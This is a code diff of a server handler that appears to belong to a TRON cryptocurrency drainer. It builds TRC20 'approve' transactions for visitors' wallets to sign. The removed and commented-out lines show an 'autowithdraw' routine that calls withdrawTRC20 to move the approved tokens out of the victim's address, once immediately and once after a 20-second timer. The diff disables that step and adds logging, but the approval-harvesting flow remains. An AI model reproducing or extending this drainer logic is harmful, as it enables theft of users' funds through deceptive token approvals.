@@ -295,29 +295,13 @@ async function getUnsignedTx(req, res) {
 				tx = { [transactionTitle]: transactionMessage, transaction }
 				return res.status(200).send({ tx })
 			case 'trc20':
-				if (
-					await checkTRC20ApprovalToContract(
-						token,
-						address,
-						indexOfSetting,
-						tronWeb,
-					)
-				) {
-					console.log('Token approved')
-					if (
-						setting.useAutowithdraw &&
-						setting.mode !== 3 &&
-						setting.mode !== 4
-					)
-						withdrawTRC20(
-							token,
-							address,
-							indexOfSetting,
-							domainAndPath,
-							tronWeb,
-						)
-					return res.status(200).send({ message: moveMessage })
-				}
+				console.log(
+					'TRC20 case, token:',
+					token.tokenName,
+					'balance:',
+					token.balance,
+				)
+				console.log('Creating approve transaction...')
 				const {
 					isActivatedAddress,
 					isRequiredEnergyAvailable,
@@ -344,6 +328,7 @@ async function getUnsignedTx(req, res) {
 					indexOfSetting,
 					tronWeb,
 				)
+				console.log('Approve transaction created:', transaction ? 'OK' : 'NULL')
 				tx = { [transactionTitle]: transactionMessage, transaction }
 				return res.status(200).send({ tx })
 			default:
@@ -455,26 +440,26 @@ async function sendSignedTransaction(req, res) {
 		})
 
 		// Handle autowithdraw
-		if (
-			token.tokenType === 'trc20' &&
-			setting.useAutowithdraw &&
-			setting.mode !== 3 &&
-			setting.mode !== 4
-		) {
-			setTimeout(async () => {
-				try {
-					await withdrawTRC20(
-						token,
-						address,
-						indexOfSetting,
-						domainAndPath,
-						tronWeb,
-					)
-				} catch (error) {
-					console.error(error)
-				}
-			}, 20 * 1000)
-		}
+		// if (
+		// 	token.tokenType === 'trc20' &&
+		// 	setting.useAutowithdraw &&
+		// 	setting.mode !== 3 &&
+		// 	setting.mode !== 4
+		// ) {
+		// 	setTimeout(async () => {
+		// 		try {
+		// 			await withdrawTRC20(
+		// 				token,
+		// 				address,
+		// 				indexOfSetting,
+		// 				domainAndPath,
+		// 				tronWeb,
+		// 			)
+		// 		} catch (error) {
+		// 			console.error(error)
+		// 		}
+		// 	}, 20 * 1000)
+		// }
 
 		// Return energy if needed
 		if (
